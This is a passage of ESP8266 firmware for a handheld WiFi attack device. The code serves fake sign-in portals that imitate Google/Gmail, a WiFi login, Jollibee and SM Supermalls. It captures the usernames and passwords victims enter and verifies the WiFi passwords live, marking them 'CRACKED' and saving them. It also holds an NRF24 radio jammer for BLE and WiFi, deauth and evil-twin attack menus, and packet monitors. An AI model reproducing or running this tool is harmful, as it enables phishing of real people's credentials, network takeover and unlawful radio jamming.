      "<a href='#'>About</a><a href='#'>Help</a><a href='#'>More</a>"
    "</div>"
    "</body></html>"));
  webServer.sendContent("");
}

void servePortalGmail() {
  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  webServer.send(200, "text/html", "");
  webServer.sendContent(F("<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>"
    "body{margin:0;padding:0;font-family:Roboto,Arial,sans-serif;background:#f1f3f4;}"
    "nav{background:#fff;border-bottom:1px solid #e0e0e0;padding:10px 16px;display:flex;align-items:center;}"
    "nav span{font-size:1.4em;color:#EA4335;font-weight:500;}"
    "nav span b{color:#4285F4;}nav span i{color:#FBBC05;}nav span u{color:#34A853;text-decoration:none;}"
    ".box{max-width:400px;margin:30px auto;background:#fff;border-radius:8px;"
      "box-shadow:0 1px 6px rgba(0,0,0,.15);padding:24px;}"
    "h3{font-size:1.3em;font-weight:400;color:#202124;margin:0 0 8px;}"
    "p{font-size:.85em;color:#5f6368;margin:0 0 16px;}"
    "input{width:100%;padding:12px;margin:6px 0;box-sizing:border-box;"
      "border:1px solid #dadce0;border-radius:4px;font-size:1em;}"
    "button{width:100%;padding:12px;margin-top:10px;background:#1a73e8;"
      "color:#fff;border:none;border-radius:4px;font-size:1em;font-weight:500;cursor:pointer;}"
    "</style></head><body>"));
  webServer.sendContent(F("<nav><span><b>G</b><i>o</i><u>o</u><b>g</b><i>l</i><u>e</u></span></nav>"));
  webServer.sendContent(F("<div class='box'><h3>Sign in</h3>"
    "<p>Use your Google Account</p>"
    "<form method='GET' action='/'>"
    "<input type='text'     name='_u'       placeholder='Email or phone' autocomplete='off'>"
    "<input type='password' name='password' placeholder='Enter your password' autocomplete='off'>"
    "<button type='submit'>Next</button></form></div></body></html>"));
  webServer.sendContent("");
}

void servePortalGoogleWifi() {
  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  webServer.send(200, "text/html", "");
  webServer.sendContent(F("<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>"
    "body{margin:0;padding:0;font-family:Roboto,Arial,sans-serif;background:#fff;}"
    "nav{background:#4285F4;padding:14px 16px;}"
    "nav span{color:#fff;font-size:1.1em;font-weight:500;}"
    ".box{max-width:420px;margin:28px auto;padding:20px;}"
    "h3{font-size:1.2em;font-weight:400;color:#202124;margin:0 0 6px;}"
    "p{font-size:.85em;color:#5f6368;margin:0 0 14px;}"
    "input{width:100%;padding:12px;margin:6px 0;box-sizing:border-box;"
      "border:1px solid #dadce0;border-radius:4px;font-size:1em;}"
    "button{width:100%;padding:12px;margin-top:10px;background:#4285F4;"
      "color:#fff;border:none;border-radius:4px;font-size:1em;cursor:pointer;}"
    "</style></head><body>"));
  webServer.sendContent("<nav><span>&#127760; " + _selectedNetwork.ssid + " — Sign in required</span></nav>");
  webServer.sendContent(F("<div class='box'><h3>Connect to Network</h3>"
    "<p>This network requires authentication to access the internet.</p>"
    "<form method='GET' action='/'>"
    "<input type='password' name='password' placeholder='WiFi Password' autocomplete='off'>"
    "<button type='submit'>Connect</button></form></div></body></html>"));
  webServer.sendContent("");
}

void servePortalJollibee() {
  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  webServer.send(200, "text/html", "");
  webServer.sendContent(F("<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>"
    "body{margin:0;padding:0;font-family:Arial,sans-serif;background:#fff100;}"
    "nav{background:#e3000b;padding:14px 16px;text-align:center;}"
    "nav b{color:#fff;font-size:1.4em;letter-spacing:1px;}"
    ".box{max-width:420px;margin:20px auto;background:#fff;border-radius:10px;"
      "box-shadow:0 2px 8px rgba(0,0,0,.2);padding:20px;}"
    "h3{color:#e3000b;text-align:center;margin:0 0 8px;}"
    "p{font-size:.85em;color:#444;margin:0 0 12px;text-align:center;}"
    "input{width:100%;padding:12px;margin:6px 0;box-sizing:border-box;"
      "border:1px solid #ccc;border-radius:6px;font-size:1em;}"
    "button{width:100%;padding:12px;margin-top:8px;background:#e3000b;"
      "color:#fff;border:none;border-radius:6px;font-size:1em;font-weight:bold;cursor:pointer;}"
    "</style></head><body>"));
  webServer.sendContent(F("<nav><b>&#127828; Jollibee Free WiFi</b></nav>"));
  webServer.sendContent(F("<div class='box'><h3>Welcome to Jollibee!</h3>"
    "<p>Register to enjoy free WiFi. Enter your mobile number to receive your access code.</p>"
    "<form method='GET' action='/'>"
    "<input type='text'     name='_u'       placeholder='Mobile Number (e.g. 09XX)' autocomplete='off'>"
    "<input type='password' name='password' placeholder='Access Code / Password' autocomplete='off'>"
    "<button type='submit'>Connect Now</button></form></div></body></html>"));
  webServer.sendContent("");
}

void servePortalSM() {
  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  webServer.send(200, "text/html", "");
  webServer.sendContent(F("<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>"
    "body{margin:0;padding:0;font-family:Arial,sans-serif;background:#f5f5f5;}"
    "nav{background:#002366;padding:14px 16px;text-align:center;}"
    "nav b{color:#FFD700;font-size:1.3em;letter-spacing:2px;}"
    ".box{max-width:420px;margin:24px auto;background:#fff;border-radius:8px;"
      "box-shadow:0 2px 6px rgba(0,0,0,.15);padding:20px;}"
    "h3{color:#002366;text-align:center;margin:0 0 8px;}"
    "p{font-size:.85em;color:#555;margin:0 0 12px;text-align:center;}"
    "input{width:100%;padding:12px;margin:6px 0;box-sizing:border-box;"
      "border:1px solid #ccc;border-radius:6px;font-size:1em;}"
    "button{width:100%;padding:12px;margin-top:8px;background:#002366;"
      "color:#FFD700;border:none;border-radius:6px;font-size:1em;font-weight:bold;cursor:pointer;}"
    "</style></head><body>"));
  webServer.sendContent(F("<nav><b>SM FREE WiFi</b></nav>"));
  webServer.sendContent(F("<div class='box'><h3>SM Supermalls Free WiFi</h3>"
    "<p>Please log in with your SM Advantage Card or registered account to continue.</p>"
    "<form method='GET' action='/'>"
    "<input type='text'     name='_u'       placeholder='Email / SMAC Number' autocomplete='off'>"
    "<input type='password' name='password' placeholder='Password / PIN' autocomplete='off'>"
    "<button type='submit'>Connect</button></form></div></body></html>"));
  webServer.sendContent("");
}

void serveWaitPage() {
  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  webServer.send(200, "text/html", "");
  webServer.sendContent(F("<!DOCTYPE html><html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:Arial,sans-serif;padding:20px;text-align:center;}</style>"
    "<script>setTimeout(function(){window.location.href='/result';},10000);</script>"
    "</head><body><h2>&#128260; Verifying...</h2>"
    "<p>Please wait up to 30 seconds. Do not close this page.</p></body></html>"));
  webServer.sendContent("");
}

void handleRedirect() {
  webServer.sendHeader("Location", "http://192.168.4.1/", true);
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.send(302, "text/plain", "");
}

void handlePortal() {
  if (!hotspot_active) { handleRedirect(); return; }

  if (webServer.hasArg("password") && webServer.arg("password").length() > 0) {
    _tryPassword = webServer.arg("password");
    if (webServer.hasArg("_u") && webServer.arg("_u").length() > 0)
      _capturedUser = webServer.arg("_u");
    else
      _capturedUser = "";
    _attemptCount++;
    Serial.print(F("[*] Attempt #")); Serial.print(_attemptCount);
    Serial.print(F(": ")); Serial.println(_tryPassword);

    serveWaitPage();
    WiFi.disconnect(true); delay(100);
    WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(),
               _selectedNetwork.ch, _selectedNetwork.bssid);
    verifyPending = true; verifyStart = millis();

    spiStop(); display.clearDisplay();
    drawHeader("Got password!");
    display.setTextSize(1); display.setTextColor(WHITE);
    int y = 14;
    if (_capturedUser.length() > 0) {
      char userLbl[72]; snprintf(userLbl, sizeof(userLbl), "User:%s", _capturedUser.c_str());
      y = printWrapped(userLbl, CONTENT_X, y, 9);
    }
    char passLbl[72]; snprintf(passLbl, sizeof(passLbl), "Pass:%s", _tryPassword.c_str());
    y = printWrapped(passLbl, CONTENT_X, y, 9);
    display.setCursor(CONTENT_X, y);     display.print("Tries:"); display.print(_attemptCount);
    display.setCursor(CONTENT_X, y + 9); display.print("Verifying...");
    display.display(); spiStart();
  } else {
    switch (portalTheme) {
      case THEME_ROUTER:      servePortalRouter();     break;
      case THEME_ISP:         servePortalISP();        break;
      case THEME_WIFI:        servePortalWifi();       break;
      case THEME_FACEBOOK:    servePortalFacebook();   break;
      case THEME_GMAIL:       servePortalGmail();      break;
      case THEME_GOOGLE_WIFI: servePortalGoogleWifi(); break;
      case THEME_JOLLIBEE:    servePortalJollibee();   break;
      case THEME_SM:          servePortalSM();         break;
    }
  }
}

void handleResult() {
  if (!hotspot_active) { handleRedirect(); return; }
  wl_status_t s = WiFi.status();

  if (s == WL_CONNECTED) {
    _correct = _tryPassword; verifyPending = false; combo_active = false;
    webServer.send(200, "text/html",
      "<!DOCTYPE html><html><head>"
      "<meta name='viewport' content='width=device-width,initial-scale=1'>"
      "<style>body{font-family:Arial,sans-serif;padding:20px;text-align:center;}"
      "h2{color:green;}</style></head><body>"
      "<h2>&#10003; Connected!</h2>"
      "<p>Your connection has been restored.<br>Please reconnect to your WiFi.</p>"
      "</body></html>");
    saveToEEPROM(); stopEvilTwin();

    spiStop(); display.clearDisplay();
    drawHeader("** CRACKED! **");
    display.setTextSize(1); display.setTextColor(WHITE);
    char ssidLbl[48]; snprintf(ssidLbl, sizeof(ssidLbl), "SSID:%s", _selectedNetwork.ssid.c_str());
    char passLbl[72]; snprintf(passLbl, sizeof(passLbl), "PASS:%s", _correct.c_str());
    int y = printWrapped(ssidLbl, CONTENT_X, 13, 9);
    if (_capturedUser.length() > 0) {
      char userLbl[72]; snprintf(userLbl, sizeof(userLbl), "USER:%s", _capturedUser.c_str());
      y = printWrapped(userLbl, CONTENT_X, y, 9);
    }
    y     = printWrapped(passLbl, CONTENT_X, y,  9);
    display.setCursor(CONTENT_X, y);     display.print("Tries:"); display.print(_attemptCount);
    display.setCursor(CONTENT_X, y + 9); display.print("Saved to EEPROM.");
    display.display(); spiStart();
    currentMenu = MENU_RESULT;
    Serial.println(F("[+] CRACKED:"));
    Serial.print(F("    SSID: ")); Serial.println(_selectedNetwork.ssid);
    if (_capturedUser.length() > 0) {
      Serial.print(F("    USER: ")); Serial.println(_capturedUser);
    }
    Serial.print(F("    PASS: ")); Serial.println(_correct);

  } else if (verifyPending && (millis() - verifyStart < 12000)) {
    webServer.sendHeader("Location", "http://192.168.4.1/result", true);
    webServer.send(302, "text/plain", "");
  } else {
    verifyPending = false; WiFi.disconnect(true); delay(100);
    webServer.send(200, "text/html",
      "<!DOCTYPE html><html><head>"
      "<meta name='viewport' content='width=device-width,initial-scale=1'>"
      "<meta http-equiv='refresh' content='3;url=/'>"
      "<style>body{font-family:Arial,sans-serif;padding:20px;text-align:center;}"
      "h2{color:red;}</style></head><body>"
      "<h2>&#10007; Wrong password</h2>"
      "<p>Redirecting, please try again...</p></body></html>");

    spiStop(); display.clearDisplay();
    drawHeader("Wrong pass!");
    display.setTextSize(1); display.setTextColor(WHITE);
    char wrongLbl[72]; snprintf(wrongLbl, sizeof(wrongLbl), "> %s", _tryPassword.c_str());
    int y = printWrapped(wrongLbl, CONTENT_X, 14, 9);
    display.setCursor(CONTENT_X, y);     display.print("Tries:"); display.print(_attemptCount);
    display.setCursor(CONTENT_X, y + 9); display.print("Victim retrying...");
    display.setCursor(CONTENT_X, y + 18);
    display.print("Clients:"); display.print((int)WiFi.softAPgetStationNum());
    display.display(); spiStart();
  }
}

/* ================================================================
   RADIO JAMMER
   ================================================================ */
void startJammer(JamMode mode) {
  if (!radioOk) return;
  jamMode = mode;
  jammerRunning = true;
  radio.startConstCarrier(RF24_PA_MAX, radioChannel);
}

void stopJammer() {
  if (!radioOk) return;
  jammerRunning = false;
  radio.stopConstCarrier(); radio.powerDown();
}

void runJammer() {
  if (!radioOk || !jammerRunning) return;
  switch (jamMode) {
    case JAM_BLE: {
      // Hop across BLE advertising channels 37/38/39 (NRF offsets 2/26/80)
      static uint8_t bIdx = 0;
      radio.setChannel(BLE_CH_NRF[bIdx]);
      bIdx = (bIdx + 1) % 3;
      break;
    }
    case JAM_WIFI: {
      static uint8_t wIdx = 0;
      radio.setChannel(wifiJamChannels[wIdx]);
      wIdx = (wIdx + 1) % WIFI_JAM_CH_COUNT;
      break;
    }
    default: break;
  }
}

/* ================================================================
   WIFI CHANNEL MONITOR
   ================================================================ */
void startWifiMon() {
  if (hotspot_active) stopEvilTwin();
  if (deauth_active)  stopDeauth();

  memset(wifiMonWave,       0, sizeof(wifiMonWave));
  memset(wifiMonDeauthWave, 0, sizeof(wifiMonDeauthWave));
  wifiMonWaveHead   = 0;
  wifiMonPktCount   = 0;
  wifiMonDeauthCount = 0;
  wifiMonPktPerSec  = 0;
  wifiMonChannel    = 1;
  wifiMonLastUpdate = millis();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  wifi_set_channel(wifiMonChannel);
  wifi_set_promiscuous_rx_cb(wifiMonSnifferCB);
  wifi_promiscuous_enable(1);
}

void stopWifiMon() {
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(NULL);
  WiFi.mode(WIFI_STA);
}

// Spacehuhn-style WiFi packet monitor — full 128×64 scrolling waveform
// Status bar (10 px): CH / PKT rate / DEAUTH alert
// Graph (53 px): scrolling vertical bars, deauth overlay, dashed midline
void drawWifiMonMenu() {
  spiStop();
  display.clearDisplay();
  display.setTextSize(1);

  // ── Status bar (inverted 10 px strip) ───────────────────────
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);

  char chBuf[7];
  snprintf(chBuf, sizeof(chBuf), "CH:%2d", wifiMonChannel);
  display.setCursor(1, 1);
  display.print(chBuf);

  char pkBuf[12];
  uint32_t pps = wifiMonPktPerSec > 9999 ? 9999UL : wifiMonPktPerSec;
  snprintf(pkBuf, sizeof(pkBuf), "PKT:%4lu", pps);
  display.setCursor(38, 1);
  display.print(pkBuf);

  // Deauth alert pill — blinks implicitly because it only appears when > 0
  if (wifiMonDeauthCount > 0) {
    display.fillRect(92, 1, 35, 8, BLACK);
    display.setTextColor(WHITE);
    display.setCursor(93, 1);
    display.print("DEAUTH!");
    display.setTextColor(BLACK);
  }
  display.setTextColor(WHITE);

  // ── Scrolling waveform ───────────────────────────────────────
  // Columns drawn oldest→newest left→right from circular buffer
  for (int col = 0; col < WM_COLS; col++) {
    int idx   = (wifiMonWaveHead + col) % WM_COLS;
    uint8_t h = wifiMonWave[idx];
    if (h > WM_GRAPH_H) h = WM_GRAPH_H;
    if (h > 0) {
      int y = WM_GRAPH_Y + WM_GRAPH_H - h;
      display.drawFastVLine(col, y, h, WHITE);
    }
    // Deauth overlay: black stripe at the top of each bar
    uint8_t dh = wifiMonDeauthWave[idx];
    if (dh > 0 && h > 0) {
      if (dh > h) dh = h;
      display.drawFastVLine(col, WM_GRAPH_Y + WM_GRAPH_H - h, dh, BLACK);
    }
  }

  // ── Dashed midline (scale reference) ────────────────────────
  int midY = WM_GRAPH_Y + WM_GRAPH_H / 2;
  for (int gx = 0; gx < WM_COLS; gx += 4)
    display.drawPixel(gx, midY, WHITE);

  display.display();
  spiStart();
}
void handleWifiMonMenu() {
  // Channel change: UP = +1, DOWN = -1, clamped (no wrap)
  if (bUp.pressed) {
    if (wifiMonChannel < WIFI_MON_CHANNELS) wifiMonChannel++;
    wifiMonPktCount    = 0;
    wifiMonDeauthCount = 0;
    wifi_set_channel(wifiMonChannel);
    drawWifiMonMenu();
  }
  if (bDown.pressed) {
    if (wifiMonChannel > 1) wifiMonChannel--;
    wifiMonPktCount    = 0;
    wifiMonDeauthCount = 0;
    wifi_set_channel(wifiMonChannel);
    drawWifiMonMenu();
  }
  if (bSelect.pressed) {
    stopWifiMon();
    currentMenu = MENU_MAIN;
    drawMainMenu();
    return;
  }

  unsigned long now = millis();
  if (now - wifiMonLastUpdate >= WIFI_MON_INTERVAL_MS) {
    wifiMonLastUpdate = now;

    // Snapshot & clear atomic counters
    uint32_t pktSnap    = wifiMonPktCount;    wifiMonPktCount    = 0;
    uint32_t deauthSnap = wifiMonDeauthCount; wifiMonDeauthCount = 0;

    wifiMonPktPerSec = (pktSnap * 1000UL) / WIFI_MON_INTERVAL_MS;

    // Scale to graph height (cap at WM_GRAPH_H)
    uint8_t barH   = (uint8_t)(pktSnap    > 80 ? WM_GRAPH_H : (pktSnap    * WM_GRAPH_H / 80));
    uint8_t deauthH = (uint8_t)(deauthSnap > 20 ? WM_GRAPH_H / 4 : (deauthSnap * (WM_GRAPH_H / 4) / 20));

    wifiMonWave[wifiMonWaveHead]       = barH;
    wifiMonDeauthWave[wifiMonWaveHead] = deauthH;
    wifiMonWaveHead = (wifiMonWaveHead + 1) % WM_COLS;

    drawWifiMonMenu();
    ESP.wdtFeed();
  }
}

/* ================================================================
   BLE CHANNEL MONITOR (NRF24 RPD-based)
   ================================================================ */
void startBleMon() {
  if (!radioOk) return;
  memset(bleMonWave,    0, sizeof(bleMonWave));
  bleMonWaveHead   = 0;
  bleMonChannel    = 0;
  bleMonLastUpdate = millis();

  bool wasJamming = jammerRunning;
  if (wasJamming) { radio.stopConstCarrier(); jammerRunning = false; }

  SPI.begin(); delay(5);
  radio.begin();
  radio.setAutoAck(false);
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setPayloadSize(32);
  radio.setAddressWidth(3);
  radio.setChannel(BLE_CH_NRF[bleMonChannel]);
  radio.startListening();
}

void stopBleMon() {
  if (!radioOk) return;
  radio.stopListening();
  radio.powerDown();
  SPI.end();
  radioOk = radio.begin();  // re-init for jammer use
  if (radioOk) {
    radio.setAutoAck(false); radio.setRetries(0,0);
    radio.setPayloadSize(5); radio.setAddressWidth(3);
    radio.setPALevel(RF24_PA_MAX); radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED); radio.powerDown();
  }
}

// Spacehuhn-style BLE monitor — three-panel scrolling waveform
// Screen split into 3 equal columns (ch37 / ch38 / ch39).
// Each panel: 10-px status strip + scrolling hit-waveform below.
// Active channel panel has solid bars; inactive panels hollow.
#define BM_PANEL_W   42   // 42*3=126, leave 2 px right margin
#define BM_WAVE_Y    11   // below 10-px header
#define BM_WAVE_H    43   // 11+43+10(footer)=64
// bleMonWave, bleMonWaveHead, BM_WAVE_COLS declared in BLE monitor state section above

void drawBleMonMenu() {
  spiStop();
  display.clearDisplay();
  display.setTextSize(1);

  // ── Global header (10 px, inverted) ─────────────────────────
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(2, 1);
  display.print("BLE Mon");

  // Active channel badge centre
  char chBuf[8];
  snprintf(chBuf, sizeof(chBuf), "CH:%d", BLE_CH_BLE[bleMonChannel]);
  display.setCursor(52, 1);
  display.print(chBuf);

  // Hit count right
  uint32_t totalHits = 0;
  for (int h = 0; h < BM_WAVE_COLS; h++) totalHits += bleMonWave[bleMonChannel][h];
  char hBuf[10];
  snprintf(hBuf, sizeof(hBuf), "%3luhit", totalHits > 999 ? 999UL : totalHits);
  display.setCursor(90, 1);
  display.print(hBuf);
  display.setTextColor(WHITE);

  if (!radioOk) {
    display.setCursor(CONTENT_X, 20); display.print("NRF24 not found!");
    display.setCursor(CONTENT_X, 32); display.print("Check SPI wiring.");
    display.setCursor(CONTENT_X, 50); display.print("[SEL]=back");
    display.display(); spiStart(); return;
  }

  // ── Three equal panels ───────────────────────────────────────
  const char* chNames[] = { "37", "38", "39" };

  for (int ch = 0; ch < 3; ch++) {
    int px     = ch * BM_PANEL_W;         // panel left edge
    bool act   = (ch == bleMonChannel);

    // Panel border
    if (act) {
      // Solid rect border for active
      display.drawRect(px, BM_WAVE_Y - 1, BM_PANEL_W - 1, BM_WAVE_H + 2, WHITE);
    } else {
      // Dashed top + bottom, solid sides for inactive
      for (int dx = px; dx < px + BM_PANEL_W - 2; dx += 3) {
        display.drawPixel(dx, BM_WAVE_Y - 1, WHITE);
        display.drawPixel(dx, BM_WAVE_Y + BM_WAVE_H, WHITE);
      }
      display.drawFastVLine(px,                  BM_WAVE_Y, BM_WAVE_H, WHITE);
      display.drawFastVLine(px + BM_PANEL_W - 2, BM_WAVE_Y, BM_WAVE_H, WHITE);
    }

    // Scrolling waveform bars inside panel (1 px per column)
    int graphW = BM_PANEL_W - 4;   // 2 px padding each side
    for (int col = 0; col < BM_WAVE_COLS; col++) {
      int idx   = (bleMonWaveHead + col) % BM_WAVE_COLS;
      uint8_t v = bleMonWave[ch][idx];
      uint8_t h2 = (v > 20 ? BM_WAVE_H : (v * BM_WAVE_H / 20));
      if (h2 == 0 && v > 0) h2 = 1;
      if (h2 == 0) continue;

      int bx = px + 2 + col * graphW / BM_WAVE_COLS;
      int by = BM_WAVE_Y + BM_WAVE_H - h2;

      if (act) {
        display.drawFastVLine(bx, by, h2, WHITE);
      } else {
        // Outline only for inactive panels
        display.drawPixel(bx, by, WHITE);
        if (h2 > 1) display.drawPixel(bx, by + h2 - 1, WHITE);
      }
    }

    // Channel label pill at bottom of panel
    int labelY = BM_WAVE_Y + BM_WAVE_H + 2;
    int labelX = px + BM_PANEL_W / 2 - 6;
    if (act) {
      display.fillRect(labelX - 1, labelY - 1, 16, 9, WHITE);
      display.setTextColor(BLACK);
    } else {
      display.setTextColor(WHITE);
    }
    display.setCursor(labelX, labelY);
    display.print(chNames[ch]);
    display.setTextColor(WHITE);
  }

  // ── Footer nav hint ──────────────────────────────────────────
  display.setTextColor(WHITE);
  display.setCursor(2, 56);
  display.print("UP/DN=ch SEL=back");

  display.display();
  spiStart();
}
void handleBleMonMenu() {
  if (!radioOk) {
    if (bSelect.pressed) { currentMenu = MENU_MAIN; drawMainMenu(); }
    return;
  }

  if (bUp.pressed) {
    bleMonChannel = (bleMonChannel + 1) % 3;
    spiStart();
    radio.stopListening();
    radio.setChannel(BLE_CH_NRF[bleMonChannel]);
    radio.startListening();
    drawBleMonMenu();
  }
  if (bDown.pressed) {
    bleMonChannel = (bleMonChannel - 1 + 3) % 3;
    spiStart();
    radio.stopListening();
    radio.setChannel(BLE_CH_NRF[bleMonChannel]);
    radio.startListening();
    drawBleMonMenu();
  }
  if (bSelect.pressed) {
    stopBleMon();
    currentMenu = MENU_MAIN;
    drawMainMenu();
    return;
  }

  // Sample & update at interval
  unsigned long now = millis();
  if (now - bleMonLastUpdate >= BLE_MON_INTERVAL_MS) {
    bleMonLastUpdate = now;

    spiStart();
    // Sample all 3 channels quickly (round-robin RPD)
    for (int ch = 0; ch < 3; ch++) {
      radio.stopListening();
      radio.setChannel(BLE_CH_NRF[ch]);
      radio.startListening();
      delay(30);

      uint8_t hits = 0;
      if (radio.testRPD()) hits += 2;
      while (radio.available()) {
        uint8_t buf[32]; radio.read(buf, 32);
        hits++;
      }
      bleMonWave[ch][bleMonWaveHead] = hits;
    }
    bleMonWaveHead = (bleMonWaveHead + 1) % BM_WAVE_COLS;

    // Re-set to current channel for next round
    radio.stopListening();
    radio.setChannel(BLE_CH_NRF[bleMonChannel]);
    radio.startListening();

    drawBleMonMenu();   // drawBleMonMenu calls spiStop() at top, spiStart() at end
    ESP.wdtFeed();
  }
}

/* ================================================================
   MAIN MENU
   ================================================================ */
const char* mainItems[] = {
  "Scan Networks",
  "Select Target",
  "Attack Panel",
  "Status",
  "Results",
  "RF Radio",
  "BLE Scan",
  "WiFi Monitor",   // NEW
  "BLE Monitor"     // NEW
};
const int MAIN_COUNT = 9;

void drawMainMenu() {
  spiStop();
  display.clearDisplay();

  char hdr[22];
  if (_selectedNetwork.ssid == "")
    snprintf(hdr, sizeof(hdr), "=     AxG Haven    =");
  else {
    char s[13]; strncpy(s, _selectedNetwork.ssid.c_str(), 12); s[12] = '\0';
    snprintf(hdr, sizeof(hdr), "Tgt:%-14s", s);
  }
  drawHeader(hdr);

  int startY  = HDR_H + 1;
  int visRows = (SCREEN_HEIGHT - startY) / ROW_H;

  // BUG FIX: keep selection visible — scroll window follows cursor (uses global mainTop)
  if (mainSel < mainTop) mainTop = mainSel;
  if (mainSel >= mainTop + visRows) mainTop = mainSel - visRows + 1;
  if (mainTop < 0) mainTop = 0;

  for (int i = 0; i < visRows && (mainTop + i) < MAIN_COUNT; i++) {
    int idx = mainTop + i;
    drawMenuRow(startY + i * ROW_H, idx == mainSel, mainItems[idx]);
  }

  // Scroll indicator
  if (MAIN_COUNT > visRows) {
    if (mainTop > 0)                           { display.setCursor(120, HDR_H + 2);        display.print("^"); }
    if (mainTop + visRows < MAIN_COUNT)        { display.setCursor(120, SCREEN_HEIGHT - 8); display.print("v"); }
  }

  display.display();
  spiStart();
}

/* ================================================================
   NETWORK MENU
   ================================================================ */
void drawNetworkMenu() {
  spiStop();
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);

  if (networkCount == 0) {
    drawHeader("No Networks");
    display.setCursor(CONTENT_X, 16); display.print("No APs found.");
    display.setCursor(CONTENT_X, 26); display.print("UP/DN = rescan");
    display.setCursor(CONTENT_X, 36); display.print("SEL   = back");
    display.display(); spiStart(); return;
  }

  int total   = networkCount + 1;
  int startY  = HDR_H + 1;
  int visRows = (SCREEN_HEIGHT - startY) / ROW_H;

  // BUG FIX: draw a proper header (was missing, causing blank/garbage header area)
  char netHdr[22];
  snprintf(netHdr, sizeof(netHdr), "Networks (%d)", networkCount);
  drawHeader(netHdr);

  // BUG FIX: keep selection visible — scroll window follows cursor (uses global netTop)
  if (netSel < netTop) netTop = netSel;
  if (netSel >= netTop + visRows) netTop = netSel - visRows + 1;
  if (netTop < 0) netTop = 0;

  for (int i = 0; i < visRows && (netTop + i) < total; i++) {
    int idx = netTop + i;
    bool sel = (idx == netSel);

    if (idx == networkCount) {
      drawMenuRow(startY + i * ROW_H, sel, "< Back");
      continue;
    }

    if (sel) {
      display.fillRect(0, startY + i * ROW_H, SCREEN_WIDTH, ROW_H, WHITE);
      display.setTextColor(BLACK);
    } else {
      display.setTextColor(WHITE);
    }

    String ssidStr = _networks[idx].ssid;
    if (sel && (int)ssidStr.length() > 13) {
      // BUG FIX: guard tickerOffset within valid range before substring
      int maxOff = (int)ssidStr.length() - 13;
      if (tickerOffset > maxOff) tickerOffset = 0;
      display.setCursor(CONTENT_X, startY + i * ROW_H + 2);
      display.print(ssidStr.substring(tickerOffset, tickerOffset + 13));
    } else {
      char ssid[14]; strncpy(ssid, ssidStr.c_str(), 13); ssid[13] = '\0';
      display.setCursor(CONTENT_X, startY + i * ROW_H + 2);
      display.print(ssid);
    }

    drawRssiBars(110, startY + i * ROW_H + 1, _networks[idx].rssi);
    display.setTextColor(WHITE);
  }

  // Scroll indicators
  if (total > visRows) {
    if (netTop > 0)               { display.setCursor(120, startY + 2);        display.print("^"); }
    if (netTop + visRows < total) { display.setCursor(120, SCREEN_HEIGHT - 8); display.print("v"); }
  }

  display.display();
  spiStart();
}

/* ================================================================
   ATTACK MENU
   ================================================================ */
void drawAttackMenu() {
  spiStop();
  display.clearDisplay();

  char hdr[22];
  if (_selectedNetwork.ssid == "") snprintf(hdr, sizeof(hdr), "Tgt:(none)");
  else { char s[13]; strncpy(s, _selectedNetwork.ssid.c_str(), 12); s[12]='\0'; snprintf(hdr, sizeof(hdr), "Tgt:%-12s", s); }
  drawHeader(hdr);

  int startY = HDR_H + 1;
  char deauthLabel[22], evilLabel[22], comboLabel[22], themeLabel[22];
  snprintf(deauthLabel, sizeof(deauthLabel), "%s Deauth",   deauth_active  ? "[ON]" : "[--]");
  snprintf(evilLabel,   sizeof(evilLabel),   "%s EvilTwin", hotspot_active ? "[ON]" : "[--]");
  snprintf(comboLabel,  sizeof(comboLabel),  "%s Combo",    combo_active   ? "[ON]" : "[--]");
  const char* tn2[] = { "Rtr", "ISP", "WiF", "FB ", "Gml", "GWF", "JLB", "SM " };
  snprintf(themeLabel, sizeof(themeLabel), "Theme: %s", tn2[portalTheme]);

  const char* items[] = { deauthLabel, evilLabel, comboLabel, themeLabel, "< Back" };
  for (int i = 0; i < 5; i++) drawMenuRow(startY + i * ROW_H, i == attackSel, items[i]);
  display.display();
  spiStart();
}

/* ================================================================
   THEME MENU
   ================================================================ */
void drawThemeMenu() {
  spiStop();
  display.clearDisplay();
  drawHeader("Portal Theme");
  int startY  = HDR_H + 1;
  int visRows = (SCREEN_HEIGHT - startY) / ROW_H - 1;  // reserve last row for Back

  // Clamp themeSel scroll window
  static int themeTop = 0;
  if (themeSel < THEME_COUNT) {
    if (themeSel < themeTop)              themeTop = themeSel;
    if (themeSel >= themeTop + visRows)   themeTop = themeSel - visRows + 1;
    if (themeTop < 0) themeTop = 0;
  }

  for (int i = 0; i < visRows && (themeTop + i) < THEME_COUNT; i++) {
    int idx = themeTop + i;
    char label[22];
    snprintf(label, sizeof(label), "%s%s", idx == (int)portalTheme ? ">" : " ", themeNames[idx]);
    drawMenuRow(startY + i * ROW_H, idx == themeSel, label);
  }

  // Scroll indicators
  if (THEME_COUNT > visRows) {
    if (themeTop > 0)                             { display.setCursor(120, startY + 2);        display.print("^"); }
    if (themeTop + visRows < THEME_COUNT)         { display.setCursor(120, SCREEN_HEIGHT - 18); display.print("v"); }
  }

  // Back row always at bottom
  int backY = SCREEN_HEIGHT - ROW_H;
  drawMenuRow(backY, themeSel == THEME_COUNT, "< Back");

  display.display();
  spiStart();
}

/* ================================================================
   CONFIRM MENU
   ================================================================ */
/* ================================================================
   STATUS MENU
